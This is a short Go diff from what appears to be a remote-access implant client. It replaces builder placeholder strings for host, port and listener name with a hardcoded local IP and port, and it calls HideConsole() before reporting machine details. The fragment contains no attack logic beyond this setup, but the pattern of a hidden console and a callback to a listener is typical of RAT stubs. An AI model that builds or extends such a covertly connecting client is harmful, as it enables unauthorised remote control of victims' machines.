@@ -9,7 +9,6 @@ import (
 	"main/TCPsocket"
 	"math/rand"
 	"net"
-	"strings"
 	"sync"
 	"time"
 
@@ -195,16 +194,16 @@ func HideConsole() {
 }
 func main() {
 
-	Host := "HostAAAABBBBCCCCDDDD"
-	Port := "PortAAAABBBBCCCCDDDD"
-	ListenerName := "ListenNameAAAABBBBCCCCDDDD"
-	PcInfo.Host = strings.ReplaceAll(Host, " ", "")
-	PcInfo.Port = strings.ReplaceAll(Port, " ", "")
-	PcInfo.ListenerName = strings.ReplaceAll(ListenerName, " ", "")
+	// Host := "HostAAAABBBBCCCCDDDD"
+	// Port := "PortAAAABBBBCCCCDDDD"
+	// ListenerName := "ListenNameAAAABBBBCCCCDDDD"
+	// PcInfo.Host = strings.ReplaceAll(Host, " ", "")
+	// PcInfo.Port = strings.ReplaceAll(Port, " ", "")
+	// PcInfo.ListenerName = strings.ReplaceAll(ListenerName, " ", "")
 
-	// PcInfo.Host = "192.168.31.81"
-	// PcInfo.Port = "4000"
-	// PcInfo.ListenerName = "asd"
+	PcInfo.Host = "192.168.31.81"
+	PcInfo.Port = "4000"
+	PcInfo.ListenerName = "asd"
 	HideConsole()
 	PcInfo.IsDotNetFour = checkDotNetFramework40()
 	ClientWorking = true
